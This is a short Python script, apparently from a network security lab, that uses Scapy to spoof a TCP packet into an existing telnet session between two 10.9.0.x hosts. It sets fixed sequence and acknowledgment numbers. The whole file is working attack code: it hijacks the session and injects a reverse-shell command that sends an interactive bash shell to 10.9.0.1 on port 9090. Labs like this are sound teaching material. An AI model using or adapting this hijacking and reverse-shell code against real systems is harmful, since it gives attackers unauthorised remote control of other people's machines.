#!/usr/bin/env python3

from scapy.all import *

src_port = 33922
seq_nbr = 2324791275
ack_nbr = 3275623433

ip = IP(src = "10.9.0.6", dst = "10.9.0.5")
tcp = TCP(sport = src_port, dport = 23, flags = "A", seq = seq_nbr, ack = ack_nbr)
data = "\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose = 0)